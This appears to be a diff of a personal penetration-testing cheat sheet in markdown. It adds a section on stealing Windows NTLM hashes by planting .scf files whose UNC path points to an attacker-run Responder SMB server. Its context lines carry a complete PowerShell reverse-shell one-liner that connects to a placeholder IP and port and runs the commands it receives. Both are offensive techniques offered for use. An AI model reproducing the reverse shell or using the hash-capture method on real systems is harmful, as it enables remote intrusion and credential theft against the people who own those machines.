@@ -1,3 +1,7 @@
+## exploiting UNC paths to get NTLM hash
+To get NTLM hashes are to somehow get an authenticated connection back to us, there by giving us hashes
+1. One of of doing it is to somehow upload .scf files to the machine. SCF files are command files which containt very limited amount of windows explorer commands, which does not need any user interaction, and gets executed the moment a user opens the directory which contains the .scf file. So hence we can specify a UNC path to connect to and set up an smb server using responder, this will give us the NTLM hashes, because given a UNC path, windows thinks that it needs to authenticate to the remote machine, thereby giving away its hash. This attack was also prevelant in .lnk(shortcuts) files but was patched. More on this here https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
 ## getting a reverse shell:-
 `powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` (via powershell)<br />
 or<br />
